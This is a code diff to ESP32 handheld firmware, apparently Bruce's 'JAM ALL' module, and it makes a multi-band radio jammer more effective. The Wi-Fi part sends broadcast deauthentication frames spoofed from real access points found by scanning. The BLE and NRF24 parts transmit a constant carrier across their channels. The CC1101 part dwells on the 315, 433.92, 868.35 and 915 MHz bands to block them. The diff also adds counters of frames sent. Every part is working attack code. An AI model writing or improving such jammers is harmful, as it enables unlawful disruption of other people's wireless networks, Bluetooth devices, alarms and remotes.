@@ -33,21 +33,60 @@ static void randomize_mac(uint8_t *mac) {
     mac[0] &= 0xFE;
 }
 
+static bool mac_is_zero(const uint8_t *mac) {
+    for (int i = 0; i < 6; i++) if (mac[i] != 0) return false;
+    return true;
+}
+
+// Honest per-band counters: only incremented on a confirmed TX.
+uint32_t jam_wifi_sent = 0;
+uint32_t jam_ble_sent = 0;
+uint32_t jam_subghz_sent = 0;
+uint32_t jam_nrf24_sent = 0;
+
 static void wifi_jam_cycle(void) {
     static uint8_t channel = 1;
+    static uint8_t ap_bssid[6] = {0};
+    static unsigned long last_scan = 0;
+
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
-
-    randomize_mac(deauth_frame + 10);
-    memcpy(deauth_frame + 16, deauth_frame + 10, 6);
-
-
-    for (int i = 0; i < 5; i++) {
-        deauth_frame[24] = random(256);
-        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+    // Pull a real AP BSSID from a scan every few seconds so the deauth frames
+    // actually match a network clients are associated with. Random BSSIDs are
+    // mostly ignored. Fall back to broadcast if no AP is known yet.
+    if (mac_is_zero(ap_bssid) || (millis() - last_scan) > 5000) {
+        last_scan = millis();
+        int n = WiFi.scanNetworks(false, false);
+        if (n > 0) {
+            int pick = random(n);
+            uint8_t *b = WiFi.BSSID(pick);
+            if (b) memcpy(ap_bssid, b, 6);
+        }
+        WiFi.scanDelete();
     }
 
-    channel = (channel % 14) + 1;
+    uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    uint8_t src[6];
+    if (!mac_is_zero(ap_bssid)) {
+        memcpy(src, ap_bssid, 6);
+    } else {
+        for (int i = 0; i < 6; i++) src[i] = 0xFF;
+    }
+
+    // Broadcast deauth: dest=FF:FF:FF:FF:FF:FF, src/bssid = real AP (or broadcast).
+    memcpy(deauth_frame + 4, bcast, 6);
+    memcpy(deauth_frame + 10, src, 6);
+    memcpy(deauth_frame + 16, src, 6);
+
+    for (int i = 0; i < 5; i++) {
+        deauth_frame[24] = random(1, 10);  // sane reason codes 1-9
+        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+        if (err == ESP_OK) jam_wifi_sent++;
+    }
+
+    // Cap at channel 13. Channel 14 is Japan-only and setChannel silently
+    // fails on most regional firmware, stalling the hop cycle.
+    channel = (channel % 13) + 1;
 }
 
 
@@ -58,22 +97,29 @@ static void ble_jam_cycle(void) {
     NRFradio.stopConstCarrier();
     NRFradio.startConstCarrier(RF24_PA_MAX, bleAdvChannels[bleChannel]);
     bleChannel = (bleChannel + 1) % 3;
+    jam_ble_sent++;
 #endif
 }
 
 
 static void subghz_jam_cycle(void) {
 #if defined(USE_CC1101_VIA_SPI)
-    static float subghzFreq = 433.92;
+    // Hold each frequency for a meaningful stretch instead of a 500us blip.
+    // A real jammer needs dwell time per band; the old code entered TX for
+    // half a millisecond then looped back and reset the radio state machine
+    // every cycle, so the duty cycle was near zero.
     static const float freqs[] = {315.0, 433.92, 868.35, 915.0};
     static int freqIdx = 0;
+    static unsigned long lastHop = 0;
 
-    ELECHOUSE_cc1101.setMHZ(subghzFreq);
-    ELECHOUSE_cc1101.SetTx();
-    delayMicroseconds(500);
-
-    subghzFreq = freqs[freqIdx];
-    freqIdx = (freqIdx + 1) % 4;
+    if (millis() - lastHop > 250) {
+        lastHop = millis();
+        ELECHOUSE_cc1101.setSidle();
+        ELECHOUSE_cc1101.setMHZ(freqs[freqIdx]);
+        ELECHOUSE_cc1101.SetTx();
+        freqIdx = (freqIdx + 1) % 4;
+        jam_subghz_sent++;
+    }
 #endif
 }
 
@@ -84,6 +130,7 @@ static void nrf24_jam_cycle(void) {
     NRFradio.stopConstCarrier();
     NRFradio.startConstCarrier(RF24_PA_MAX, nrfChannel);
     nrfChannel = (nrfChannel + 2) % 126;
+    jam_nrf24_sent++;
 #endif
 }
 
@@ -112,6 +159,20 @@ void jamall_init(JamAllState &state) {
 
 void jamall_start_band(JamAllState &state, JamBand band) {
     if (!state.bands[band].available) return;
+
+    // BLE and NRF24 share the single NRF24L01 radio, so they cannot run
+    // together. Enabling one disables the other to stop them fighting over
+    // startConstCarrier/stopConstCarrier every cycle.
+#if defined(USE_NRF24_VIA_SPI)
+    if (band == JAM_BLE) {
+        if (state.bands[JAM_NRF24].active) jamall_stop_band(state, JAM_NRF24);
+        state.bands[JAM_NRF24].enabled = false;
+    } else if (band == JAM_NRF24) {
+        if (state.bands[JAM_BLE].active) jamall_stop_band(state, JAM_BLE);
+        state.bands[JAM_BLE].enabled = false;
+    }
+#endif
+
     state.bands[band].active = true;
     state.bands[band].enabled = true;
 }
@@ -121,6 +182,18 @@ void jamall_stop_band(JamAllState &state, JamBand band) {
 }
 
 void jamall_start_all(JamAllState &state) {
+
+    // Reset honest counters for this run.
+    jam_wifi_sent = jam_ble_sent = jam_subghz_sent = jam_nrf24_sent = 0;
+
+    // BLE and NRF24 share one radio. If both are enabled, keep BLE and drop
+    // NRF24 so the radio is not yanked between two jam cycles every tick.
+#if defined(USE_NRF24_VIA_SPI)
+    if (state.bands[JAM_BLE].enabled && state.bands[JAM_NRF24].enabled) {
+        state.bands[JAM_NRF24].enabled = false;
+        state.bands[JAM_NRF24].active = false;
+    }
+#endif
 
     if (state.bands[JAM_WIFI_24].enabled && state.bands[JAM_WIFI_24].available) {
         WiFi.mode(WIFI_STA);
@@ -195,24 +268,36 @@ void jamall_update(JamAllState &state) {
     }
 
 
+    // Activity level is derived from whether frames actually went out this
+    // tick, not a random number. Each band decays so the bar settles when the
+    // radio stops delivering.
+    auto pulse = [](uint8_t &lvl, uint32_t before, uint32_t after) {
+        if (after > before) lvl = 10;
+        else if (lvl > 0) lvl--;
+    };
+
     if (state.bands[JAM_WIFI_24].active) {
+        uint32_t b = jam_wifi_sent;
         wifi_jam_cycle();
-        state.bands[JAM_WIFI_24].level = random(5, 10);
+        pulse(state.bands[JAM_WIFI_24].level, b, jam_wifi_sent);
     }
 
     if (state.bands[JAM_BLE].active) {
+        uint32_t b = jam_ble_sent;
         ble_jam_cycle();
-        state.bands[JAM_BLE].level = random(4, 9);
+        pulse(state.bands[JAM_BLE].level, b, jam_ble_sent);
     }
 
     if (state.bands[JAM_SUBGHZ].active) {
+        uint32_t b = jam_subghz_sent;
         subghz_jam_cycle();
-        state.bands[JAM_SUBGHZ].level = random(6, 10);
+        pulse(state.bands[JAM_SUBGHZ].level, b, jam_subghz_sent);
     }
 
     if (state.bands[JAM_NRF24].active) {
+        uint32_t b = jam_nrf24_sent;
         nrf24_jam_cycle();
-        state.bands[JAM_NRF24].level = random(3, 8);
+        pulse(state.bands[JAM_NRF24].level, b, jam_nrf24_sent);
     }
 
     esp_task_wdt_reset();
@@ -240,6 +325,13 @@ void jamall_draw_gui(JamAllState &state) {
     tft.drawString("JAM ALL", padX, startY, 1);
     tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
     tft.drawRightString(timeStr, tftWidth - padX, startY, 1);
+
+    // Honest total of frames that actually left the radio across all bands.
+    uint32_t total = jam_wifi_sent + jam_ble_sent + jam_subghz_sent + jam_nrf24_sent;
+    tft.setTextColor(tft.color565(120, 120, 120), bruceConfig.bgColor);
+    char sentStr[24];
+    snprintf(sentStr, sizeof(sentStr), "sent: %lu", (unsigned long)total);
+    tft.drawCentreString(sentStr, tftWidth / 2, startY, 1);
 
     startY += 18;
 
